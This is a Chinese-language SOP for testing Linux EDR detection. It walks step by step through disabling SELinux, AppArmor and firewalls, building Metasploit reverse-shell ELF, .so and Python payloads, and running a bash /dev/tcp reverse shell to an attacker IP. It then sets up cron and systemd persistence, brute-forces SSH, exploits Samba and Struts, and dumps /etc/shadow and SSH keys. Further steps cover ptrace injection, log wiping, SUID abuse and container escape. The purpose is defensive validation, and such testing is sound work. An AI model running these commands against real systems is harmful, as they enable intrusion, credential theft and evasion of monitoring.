# EDR 偵測驗測 SOP — Linux

**目的**：使用 Metasploit 及輔助工具在 Linux 受測端點觸發 EDR 告警，驗證 hash hunting 記錄是否正常。 **適用平台**：Ubuntu 20.04/22.04/24.04、CentOS 7/8/9、RHEL 8/9、Debian 11/12

---

## Linux 發行版差異速查表

| 項目 | Ubuntu / Debian | CentOS / RHEL |
| :---- | :---- | :---- |
| 套件管理 | apt | yum / dnf |
| 防火牆 | ufw (iptables) | firewalld (nftables) |
| SELinux | 預設未啟用（AppArmor） | **預設 Enforcing** |
| AppArmor | 預設啟用 | 預設未安裝 |
| 系統日誌 | journalctl / syslog | journalctl / syslog |
| 預設 Shell | bash | bash |
| 審計框架 | auditd（需安裝） | auditd（預設安裝） |
| 預設防毒 | 無（需額外安裝） | 無（需額外安裝） |
| Cron 位置 | /etc/crontab, /var/spool/cron/crontabs/ | /etc/crontab, /var/spool/cron/ |
| Systemd | 是 | 是 |

---

## Phase 0：環境準備（兩平台共用）

### 0-1. 確認 EDR Agent 狀態

\# 確認 Xensor Agent 運行中（CyCraft）

systemctl status xensor-agent

ps aux | grep \-i xensor

\# 通用：確認 EDR agent 程序

ps aux | grep \-iE "(xensor|crowdstrike|falcon|sentinel|carbon|edr|endpoint)"

\# 確認 agent 與管理平台連線（檢查網路連線）

ss \-tnp | grep \-i xensor

netstat \-tnp 2\>/dev/null | grep \-i xensor

### 0-2. 建立測試目錄

sudo mkdir \-p /opt/edr\_test

sudo chmod 777 /opt/edr\_test

### 0-3. 備份目前安全設定（測試完要還原）

\# 備份 SELinux 狀態（CentOS/RHEL）

getenforce \> /opt/edr\_test/selinux\_backup.txt

\# 備份 AppArmor 狀態（Ubuntu）

sudo aa-status \> /opt/edr\_test/apparmor\_backup.txt 2\>/dev/null

\# 備份防火牆規則

sudo iptables-save \> /opt/edr\_test/iptables\_backup.rules

sudo firewall-cmd \--list-all \> /opt/edr\_test/firewalld\_backup.txt 2\>/dev/null

sudo ufw status verbose \> /opt/edr\_test/ufw\_backup.txt 2\>/dev/null

\# 記錄目前 auditd 規則

sudo auditctl \-l \> /opt/edr\_test/audit\_rules\_backup.txt 2\>/dev/null

### 0-4. 確認必要工具

\# 檢查常用工具是否存在

which curl wget python3 perl gcc make nmap 2\>/dev/null

\# 記錄核心版本

uname \-a \> /opt/edr\_test/system\_info.txt

cat /etc/os-release \>\> /opt/edr\_test/system\_info.txt

---

## Phase 1：關閉安全機制干擾

**重點**：Linux 沒有類似 Windows Defender 的內建防毒，主要干擾來自 SELinux、AppArmor、防火牆。

### 1-1. SELinux（CentOS / RHEL）

\# 查看目前狀態

getenforce

\# Enforcing \= 會阻擋可疑行為

\# Permissive \= 僅記錄不阻擋

\# Disabled \= 完全關閉

\# 暫時切換為 Permissive（不需重啟，重啟後還原）

sudo setenforce 0

\# 驗證

getenforce

\# 應顯示 Permissive

**注意**：不建議永久 Disable SELinux（需改 /etc/selinux/config 並重啟），測試用 Permissive 即可。

### 1-2. AppArmor（Ubuntu / Debian）

\# 查看狀態

sudo aa-status

\# 暫時將所有 profile 切為 complain 模式（僅記錄不阻擋）

sudo aa-complain /etc/apparmor.d/\*

\# 或直接停用 AppArmor 服務（測試完要啟動）

sudo systemctl stop apparmor

sudo systemctl disable apparmor

### 1-3. 防火牆

#### Ubuntu (ufw)

\# 查看狀態

sudo ufw status

\# 暫時關閉

sudo ufw disable

\# 或允許測試用端口

sudo ufw allow 4444/tcp

sudo ufw allow 4445/tcp

sudo ufw allow 8080/tcp

#### CentOS / RHEL (firewalld)

\# 查看狀態

sudo firewall-cmd \--state

\# 暫時關閉

sudo systemctl stop firewalld

\# 或允許測試用端口

sudo firewall-cmd \--add-port=4444/tcp \--permanent

sudo firewall-cmd \--add-port=4445/tcp \--permanent

sudo firewall-cmd \--add-port=8080/tcp \--permanent

sudo firewall-cmd \--reload

### 1-4. 統一驗證

echo "=== SELinux \==="

getenforce 2\>/dev/null || echo "N/A (not installed)"

echo \-e "\\n=== AppArmor \==="

sudo aa-status 2\>/dev/null | head \-5 || echo "N/A (not installed)"

echo \-e "\\n=== Firewall \==="

sudo ufw status 2\>/dev/null || sudo firewall-cmd \--state 2\>/dev/null || echo "Unknown"

echo \-e "\\n=== EDR Agent \==="

systemctl is-active xensor-agent 2\>/dev/null || echo "Check manually"

---

## Phase 2：產生測試樣本（攻擊機端）

在 Kali / 攻擊機上操作。每個樣本產生後立即記錄 hash。

### Test 1 — EICAR 標準測試檔

echo 'X5O\!P%@AP\[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE\!$H+H\*' \> /tmp/eicar.com

sha256sum /tmp/eicar.com

\# 已知 MD5: 44d88612fea8a8f36de82e1278abb02f

**預期偵測**：靜態特徵比對、hash 命中（若有裝 ClamAV 或 EDR 有 hash 掃描）

### Test 2 — Msfvenom reverse\_tcp ELF

msfvenom \-p linux/x64/meterpreter/reverse\_tcp \\

  LHOST=\<攻擊機IP\> LPORT=4444 \\

  \-f elf \-o /tmp/test\_revtcp.elf

chmod \+x /tmp/test\_revtcp.elf

sha256sum /tmp/test\_revtcp.elf

**預期偵測**：已知惡意 ELF hash、Meterpreter shellcode signature

### Test 3 — Msfvenom exec（行為偵測）

msfvenom \-p linux/x64/exec CMD="id;whoami;cat /etc/passwd" \\

  \-f elf \-o /tmp/test\_exec.elf

chmod \+x /tmp/test\_exec.elf

sha256sum /tmp/test\_exec.elf

**預期偵測**：可疑程式執行敏感指令（讀取 /etc/passwd）

### Test 4 — Shared Object (.so) 注入測試

msfvenom \-p linux/x64/meterpreter/reverse\_tcp \\

  LHOST=\<攻擊機IP\> LPORT=4445 \\

  \-f elf-so \-o /tmp/test\_inject.so

sha256sum /tmp/test\_inject.so

**預期偵測**：可疑 shared library 載入、hash hunting 命中

### Test 5 — Python 腳本 payload（Fileless 偵測）

msfvenom \-p python/meterpreter/reverse\_tcp \\

  LHOST=\<攻擊機IP\> LPORT=4446 \\

  \-o /tmp/test\_fileless.py

sha256sum /tmp/test\_fileless.py

**預期偵測**：可疑 Python 程序反連、script 執行偵測

### Test 6 — Bash one-liner reverse shell

\# 不需 msfvenom，直接記錄此指令供受測端執行

cat \> /tmp/test\_bash\_revshell.sh \<\< 'SHELL'

\#\!/bin/bash

bash \-i \>& /dev/tcp/\<攻擊機IP\>/4447 0\>&1

SHELL

chmod \+x /tmp/test\_bash\_revshell.sh

sha256sum /tmp/test\_bash\_revshell.sh

**預期偵測**：bash reverse shell 偵測、/dev/tcp 濫用告警

### Test 7 — Cron persistence 腳本

cat \> /tmp/test\_cron\_persist.sh \<\< 'PERSIST'

\#\!/bin/bash

\# Simulated persistence via cron

(crontab \-l 2\>/dev/null; echo "\*/5 \* \* \* \* /tmp/test\_revtcp.elf") | crontab \-

PERSIST

chmod \+x /tmp/test\_cron\_persist.sh

sha256sum /tmp/test\_cron\_persist.sh

**預期偵測**：crontab 修改告警、持久化機制偵測

---

## Phase 3：受測端點執行（逐一測試）

### 建立 Hash 追蹤表

| \# | 檔案名稱 | SHA256 | 發行版 | 執行方式 | EDR 告警(Y/N) | Hash Hunting 記錄(Y/N) | 告警名稱/類型 | 備註 |
| :---- | :---- | :---- | :---- | :---- | :---- | :---- | :---- | :---- |
| 1 | eicar.com | (填入) | Ubuntu / CentOS | 落地 |  |  |  |  |
| 2 | test\_revtcp.elf | (填入) | Ubuntu / CentOS | ./執行 |  |  |  |  |
| ... |  |  |  |  |  |  |  |  |

### 執行 SOP（每個樣本）

1. **傳輸檔案**到受測端點 `/opt/edr_test/`

\# 從攻擊機用 SCP 傳送

scp /tmp/test\_revtcp.elf user@\<受測機IP\>:/opt/edr\_test/

\# 或用 Python HTTP server \+ wget

\# 攻擊機：

python3 \-m http.server 8888 \-d /tmp

\# 受測機：

wget http://\<攻擊機IP\>:8888/test\_revtcp.elf \-O /opt/edr\_test/test\_revtcp.elf

2. **記錄傳輸時間**（用於對照 EDR timeline）

date \-u '+%Y-%m-%dT%H:%M:%SZ' | tee /opt/edr\_test/timestamp\_transfer.txt

3. **執行**：

\# ELF 類

chmod \+x /opt/edr\_test/test\_revtcp.elf

/opt/edr\_test/test\_revtcp.elf &

\# .so 類（LD\_PRELOAD 注入）

LD\_PRELOAD=/opt/edr\_test/test\_inject.so /bin/ls

\# Python 類

python3 /opt/edr\_test/test\_fileless.py &

\# Bash reverse shell

bash /opt/edr\_test/test\_bash\_revshell.sh &

\# Cron persistence

bash /opt/edr\_test/test\_cron\_persist.sh

4. **等待 1-3 分鐘**讓 EDR agent 上傳事件  
     
5. **到 XCockpit 檢查**：  
     
   - Dashboard → 告警列表，搜尋對應時間區間  
   - Hash Hunting → 貼上 SHA256 搜尋  
   - Timeline → 查看程序執行鏈（parent → child process）  
   - 注意 Linux 特有偵測：fork/exec chain、LD\_PRELOAD、/dev/tcp

   

6. **記錄結果**到追蹤表  
     
7. **清理該樣本**後再測下一個

\# 清除執行中的測試程序

kill $(pgrep \-f edr\_test) 2\>/dev/null

\# 清除 cron 持久化

crontab \-r 2\>/dev/null

---

## Phase 4：Metasploit Console 進階場景

### 4-1. 監聽端設定（攻擊機）

msfconsole

use exploit/multi/handler

set PAYLOAD linux/x64/meterpreter/reverse\_tcp

set LHOST \<攻擊機IP\>

set LPORT 4444

run \-j

### 4-2. SSH Brute Force 測試

use auxiliary/scanner/ssh/ssh\_login

set RHOSTS \<受測機IP\>

set USERNAME testuser

set PASS\_FILE /usr/share/wordlists/rockyou.txt

set STOP\_ON\_SUCCESS true

set THREADS 5

run

**預期偵測**：SSH brute force 告警、大量失敗登入事件

### 4-3. Web Delivery — Python

use exploit/multi/script/web\_delivery

set TARGET 7  \# Python

set PAYLOAD python/meterpreter/reverse\_tcp

set LHOST \<攻擊機IP\>

set LPORT 8080

run

複製輸出的 Python one-liner，在受測機以 `python3 -c "..."` 執行。

**預期偵測**：可疑 Python 網路連線、fileless payload 偵測

### 4-4. Exploit 已知 Linux 漏洞

\# Samba（受測機需有 Samba 服務）

use exploit/linux/samba/is\_known\_pipename

set RHOSTS \<受測機IP\>

set SMBUser testuser

set SMBPass testpass

run

\# Apache Struts（受測機需有 Struts 服務）

use exploit/multi/http/struts2\_content\_type\_ognl

set RHOSTS \<受測機IP\>

set RPORT 8080

run

這些需要受測機有對應的漏洞服務，建議用 Docker 容器部署測試環境。

### 4-5. Post-Exploitation（取得 session 後）

\# 系統資訊蒐集 — 觸發偵察行為告警

sysinfo

getuid

run post/linux/gather/enum\_system

run post/linux/gather/enum\_network

run post/linux/gather/hashdump

\# Credential Dumping — 觸發讀取 /etc/shadow 告警

cat /etc/shadow

cat /etc/passwd

\# Process Injection — 觸發注入告警

run post/linux/manage/inject\_in\_process PROCESS=sshd

\# Persistence — 觸發持久化告警

run post/linux/manage/sshkey\_persistence CREATESSHFOLDER=true

\# SSH Key 竊取

run post/linux/gather/enum\_ssh\_keys

\# 權限提升偵測

run post/multi/recon/local\_exploit\_suggester

| 動作 | 預期 EDR 告警類型 |
| :---- | :---- |
| enum\_system / enum\_network | Reconnaissance, System Enumeration |
| hashdump / cat /etc/shadow | Credential Access, Sensitive File Read |
| inject\_in\_process | Process Injection, ptrace Attach |
| sshkey\_persistence | Persistence, SSH Key Modification |
| enum\_ssh\_keys | Credential Access, SSH Key Theft |
| local\_exploit\_suggester | Privilege Escalation Attempt |

---

## Phase 5：Linux 原生攻擊技術測試

以下不需 Metasploit，直接在受測端執行，測試 EDR 對 Linux 原生攻擊手法的偵測能力。

### 5-1. 常見 Linux 攻擊手法（逐一執行並檢查告警）

\# T1059.004 — Bash Shell 執行

bash \-c "echo test\_edr\_bash\_execution"

\# T1053.003 — Cron Job 持久化

(crontab \-l 2\>/dev/null; echo "\* \* \* \* \* /tmp/test.sh") | crontab \-

\# T1070.002 — 清除 Linux 日誌（反鑑識）

echo "" | sudo tee /var/log/auth.log

sudo journalctl \--vacuum-time=1s

\# T1003.008 — /etc/passwd \+ /etc/shadow 讀取

cat /etc/passwd

sudo cat /etc/shadow

\# T1055.009 — ptrace 程序注入

\# 需要 gdb

echo 'call system("id \> /tmp/ptrace\_test.txt")' | sudo gdb \-p $(pgrep \-o sshd) \-batch 2\>/dev/null

\# T1548.001 — SUID/SGID 濫用

sudo cp /bin/bash /opt/edr\_test/suid\_bash

sudo chmod u+s /opt/edr\_test/suid\_bash

/opt/edr\_test/suid\_bash \-p \-c "id"

\# T1543.002 — Systemd service 持久化

cat \> /tmp/test\_edr.service \<\< 'SVC'

\[Unit\]

Description=EDR Test Service

\[Service\]

ExecStart=/opt/edr\_test/test\_revtcp.elf

Restart=always

\[Install\]

WantedBy=multi-user.target

SVC

sudo cp /tmp/test\_edr.service /etc/systemd/system/

sudo systemctl daemon-reload

\# T1136.001 — 建立本地帳號

sudo useradd \-m \-s /bin/bash edr\_test\_user

\# T1090 — 可疑網路行為（反連、tunnel）

curl \-s http://\<攻擊機IP\>:8080/callback\_test || true

python3 \-c "import socket;s=socket.socket();s.connect(('\<攻擊機IP\>',4444));s.close()" 2\>/dev/null || true

\# T1574.006 — LD\_PRELOAD Hijacking

LD\_PRELOAD=/opt/edr\_test/test\_inject.so /usr/bin/id

\# T1222.002 — 修改檔案權限

chmod 777 /etc/crontab 2\>/dev/null

chmod 4755 /opt/edr\_test/test\_exec.elf 2\>/dev/null

### 5-2. 容器逃逸相關測試（若有 Docker）

\# 檢查是否在容器中

cat /proc/1/cgroup | grep \-i docker

\# 掛載 host filesystem（容器逃逸模擬）

docker run \-v /:/host \-it ubuntu chroot /host /bin/bash \-c "cat /etc/shadow" 2\>/dev/null

\# 特權容器偵測

docker run \--privileged \-it ubuntu id 2\>/dev/null

---

## Phase 6：Atomic Red Team for Linux

Atomic Red Team 支援 Linux，可按 MITRE ATT\&CK TID 組織測試。

### 安裝

\# 安裝 PowerShell（Ubuntu）

sudo apt-get install \-y powershell

\# 安裝 PowerShell（CentOS/RHEL）

sudo dnf install \-y powershell

\# 安裝 Atomic Red Team

pwsh \-Command "IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' \-UseBasicParsing); Install-AtomicRedTeam \-getAtomics"

### 推薦 Linux 測試 TID

| TID | 名稱 | 說明 | Ubuntu | CentOS |
| :---- | :---- | :---- | :---- | :---- |
| T1059.004 | Unix Shell | Bash 指令執行 | ✅ | ✅ |
| T1053.003 | Cron | 排程任務持久化 | ✅ | ✅ |
| T1003.008 | /etc/passwd & /etc/shadow | 憑證存取 | ✅ | ✅ |
| T1070.002 | Clear Linux Logs | 清除系統日誌 | ✅ | ✅ |
| T1548.001 | SUID/SGID | 權限提升 | ✅ | ✅ |
| T1543.002 | Systemd Service | 服務持久化 | ✅ | ✅ |
| T1136.001 | Local Account | 建立帳號 | ✅ | ✅ |
| T1055.009 | Ptrace Injection | 程序注入 | ✅ | ✅ |
| T1574.006 | LD\_PRELOAD Hijack | 動態連結器劫持 | ✅ | ✅ |
| T1021.004 | SSH Lateral Movement | SSH 橫向移動 | ✅ | ✅ |

### 執行

pwsh \-Command "Import-Module \~/AtomicRedTeam/invoke-atomicredteam/Invoke-AtomicRedTeam.psd1; Invoke-AtomicTest T1059.004 \-GetPrereqs; Invoke-AtomicTest T1059.004"

\# 清理

pwsh \-Command "Import-Module \~/AtomicRedTeam/invoke-atomicredteam/Invoke-AtomicRedTeam.psd1; Invoke-AtomicTest T1059.004 \-Cleanup"

---

## Phase 7：測試完畢還原

\# 1\. 還原 SELinux（CentOS/RHEL）

sudo setenforce 1

getenforce  \# 應顯示 Enforcing

\# 2\. 還原 AppArmor（Ubuntu）

sudo systemctl start apparmor

sudo systemctl enable apparmor

sudo aa-enforce /etc/apparmor.d/\*

\# 3\. 還原防火牆

\# Ubuntu

sudo ufw enable

sudo ufw delete allow 4444/tcp

sudo ufw delete allow 4445/tcp

sudo ufw delete allow 8080/tcp

\# CentOS/RHEL

sudo systemctl start firewalld

sudo firewall-cmd \--remove-port=4444/tcp \--permanent

sudo firewall-cmd \--remove-port=4445/tcp \--permanent

sudo firewall-cmd \--remove-port=8080/tcp \--permanent

sudo firewall-cmd \--reload

\# 4\. 清除測試帳號

sudo userdel \-r edr\_test\_user 2\>/dev/null

\# 5\. 清除 SUID 測試檔案

sudo rm \-f /opt/edr\_test/suid\_bash

\# 6\. 移除測試 systemd service

sudo systemctl stop test\_edr.service 2\>/dev/null

sudo systemctl disable test\_edr.service 2\>/dev/null

sudo rm \-f /etc/systemd/system/test\_edr.service

sudo systemctl daemon-reload

\# 7\. 清除 crontab

crontab \-r 2\>/dev/null

\# 8\. 殺掉殘留測試程序

sudo kill $(pgrep \-f edr\_test) 2\>/dev/null

sudo kill $(pgrep \-f meterpreter) 2\>/dev/null

\# 9\. 還原 iptables（如有備份）

sudo iptables-restore \< /opt/edr\_test/iptables\_backup.rules 2\>/dev/null

\# 10\. 清除測試目錄

sudo rm \-rf /opt/edr\_test

\# 11\. 驗證還原

echo "=== SELinux \===" && getenforce 2\>/dev/null

echo "=== AppArmor \===" && sudo aa-status 2\>/dev/null | head \-3

echo "=== Firewall \===" && (sudo ufw status 2\>/dev/null || sudo firewall-cmd \--state 2\>/dev/null)

echo "=== Test user \===" && id edr\_test\_user 2\>/dev/null || echo "Removed"

echo "=== Test procs \===" && pgrep \-f edr\_test || echo "None running"

---

## 常見問題排除

| 症狀 | 原因 | 解法 |
| :---- | :---- | :---- |
| ELF payload 無法執行 | 缺少執行權限 | `chmod +x payload.elf` |
| ELF payload 被 SELinux 擋 | SELinux Enforcing 模式 | `sudo setenforce 0` |
| Reverse shell 連不回 | 防火牆阻擋出站 | 關閉防火牆或開放對應 port |
| Python payload 失敗 | Python 版本不對 | 確認 `python3` 可用，或改用 `python/meterpreter_reverse_tcp`（stageless） |
| SSH brute force 被鎖 | fail2ban 啟用 | `sudo systemctl stop fail2ban` |
| LD\_PRELOAD 無效 | SUID binary 忽略 LD\_PRELOAD | 改用非 SUID binary 測試 |
| ptrace 注入失敗 | Yama ptrace\_scope 限制 | `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` |
| Meterpreter session 斷線 | EDR 殺掉了連線 | 這正是要測試的偵測能力，記錄告警內容 |
| Atomic Red Team 安裝失敗 | PowerShell 未安裝 | 先安裝 pwsh（見 Phase 6） |
| auditd 大量告警干擾 | 審計規則太嚴格 | `sudo auditctl -D` 暫時清除規則（測完用備份還原） |
| 容器中無法執行 | PID namespace 隔離 | 使用 `--privileged` 或 host network 模式 |

---

## Linux vs Windows 測試對照表

| 測試項目 | Windows 對應 | Linux 對應 |
| :---- | :---- | :---- |
| Payload 格式 | PE (.exe) | ELF |
| DLL 注入 | rundll32 / DLL sideload | LD\_PRELOAD / .so injection |
| Fileless 攻擊 | PowerShell | Python / Bash one-liner |
| 持久化 — 排程 | Task Scheduler | Cron / Systemd Timer |
| 持久化 — 服務 | Windows Service | Systemd Service |
| 持久化 — 啟動 | Registry Run Key | .bashrc / .profile / rc.local |
| 憑證竊取 | LSASS dump | /etc/shadow / SSH keys |
| 橫向移動 | PsExec / WMI | SSH / SCP |
| 權限提升 | getsystem / UAC bypass | SUID/SGID / Kernel exploit |
| 程序注入 | CreateRemoteThread | ptrace attach |
| 反鑑識 | 清除 Event Log | 清除 /var/log/ / journalctl |
| 安全機制關閉 | Defender \+ SmartScreen | SELinux \+ AppArmor \+ firewall |

